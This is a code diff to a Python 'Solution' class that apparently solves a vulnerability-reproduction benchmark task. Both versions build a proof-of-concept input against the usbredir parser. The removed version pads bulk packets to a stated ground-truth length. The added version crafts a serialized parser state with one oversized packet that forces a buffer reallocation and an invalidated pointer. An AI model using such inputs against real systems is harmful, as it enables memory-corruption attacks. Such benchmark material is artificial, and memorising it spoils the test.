@@ -11,66 +11,52 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        USB_REDIR_BULK_PACKET = 5
+        # Constants based on usbredir source code analysis
+        USB_REDIR_PARSER_MAGIC = 0x50425355  # "USBP"
+        USB_REDIR_PARSER_VERSION = 1
+        USB_REDIR_DATA_PACKET = 3
+        USBREDIRPARSER_SERIALIZE_BUF_SIZE = 64 * 1024
+        SIZEOF_EP_INFO_ARRAY = 256
 
-        def create_bulk_out_packet(endpoint: int, data: bytes) -> bytes:
-            """
-            Creates a single usbredir bulk packet.
-            """
-            packet_type = USB_REDIR_BULK_PACKET
-            data_len = len(data)
-            
-            # struct usbredir_bulk_packet {
-            #     uint32_t endpoint;
-            #     uint32_t length;
-            #     uint32_t stream_id;
-            # }; -> 12 bytes
-            struct_len = 12
-            
-            # struct usbredir_header {
-            #     uint32_t type;
-            #     uint32_t length;
-            # }; -> 8 bytes
-            # The length field in the header is for the payload that follows.
-            header = struct.pack('<II', packet_type, struct_len + data_len)
-            
-            # An OUT endpoint must not have the 0x80 bit set.
-            bulk_packet_struct = struct.pack('<III', endpoint, data_len, 0)
-            
-            return header + bulk_packet_struct + data
+        poc_parts = []
 
-        poc_bytes = bytearray()
-        
-        # The vulnerability is triggered when serializing a parser state with
-        # a large amount of buffered write data, causing a reallocation of the
-        # state buffer (default 64kB) and invalidating a pointer.
-        # We construct a PoC by sending a stream of bulk OUT packets to fill
-        # this buffer. The ground-truth PoC length of 71298 bytes is our target.
+        # Construct the header and parser state part of the serialized data.
+        # This structure must match what `usbredirparser_deserialize` expects.
+        poc_parts.append(struct.pack('<II', USB_REDIR_PARSER_MAGIC, USB_REDIR_PARSER_VERSION))
+        poc_parts.append(struct.pack('<Q', 0))  # id
+        poc_parts.append(struct.pack('<i', 0))  # type
+        poc_parts.append(b'\x00' * SIZEOF_EP_INFO_ARRAY)  # ep_info_in
+        poc_parts.append(b'\x00' * SIZEOF_EP_INFO_ARRAY)  # ep_info_out
+        poc_parts.append(struct.pack('<I', 0))  # buffered_bulk_packet_count
 
-        # A standard packet with 1 byte of data has a wire size of:
-        # 8 (header) + 12 (bulk_packet struct) + 1 (data) = 21 bytes.
-        
-        # To reach 71298 bytes: 71298 / 21 = 3395.14...
-        # We can construct this by using 3394 packets of 21 bytes and one
-        # final packet to make up the difference.
-        # 3394 * 21 = 71274 bytes.
-        # 71298 - 71274 = 24 bytes remaining.
-        
-        # A 24-byte packet consists of:
-        # 8 (header) + 16 (payload)
-        # payload = 12 (struct) + 4 (data)
-        
-        endpoint = 0x01  # A standard BULK OUT endpoint
-        num_packets_with_1_byte_data = 3394
-        
-        # Generate the main sequence of packets
-        for _ in range(num_packets_with_1_byte_data):
-            packet = create_bulk_out_packet(endpoint, b'\x00')
-            poc_bytes.extend(packet)
-            
-        # Generate the final packet to match the exact length
-        final_packet_data = b'\x00\x00\x00\x00'
-        final_packet = create_bulk_out_packet(endpoint, final_packet_data)
-        poc_bytes.extend(final_packet)
+        # The size of the state written before the write buffers.
+        # This determines the initial offset within the serialization buffer.
+        state_header_size = sum(len(p) for p in poc_parts)
 
-        return bytes(poc_bytes)
+        # During serialization, 4 bytes are reserved for the write buffer count.
+        # This advances the internal pointer.
+        offset_before_packets = state_header_size + 4
+
+        # Calculate remaining space in the default 64kB serialization buffer.
+        remaining_space = USBREDIRPARSER_SERIALIZE_BUF_SIZE - offset_before_packets
+
+        # To trigger the realloc, the next serialized item (a packet) must
+        # be larger than the remaining space. A packet consists of an 8-byte
+        # header and its data.
+        # We need: 8 + packet_data_len > remaining_space
+        # The smallest integer length that satisfies this is:
+        # packet_data_len = remaining_space - 8 + 1 = remaining_space - 7
+        packet_data_len = remaining_space - 7
+        
+        # A single large packet is sufficient and creates a minimal PoC.
+        num_packets = 1
+
+        # Add the number of write buffers to our PoC.
+        poc_parts.append(struct.pack('<I', num_packets))
+        
+        # Add the single large write buffer itself.
+        packet_header = struct.pack('<II', USB_REDIR_DATA_PACKET, packet_data_len)
+        packet_data = b'\x41' * packet_data_len
+        poc_parts.append(packet_header + packet_data)
+        
+        return b''.join(poc_parts)
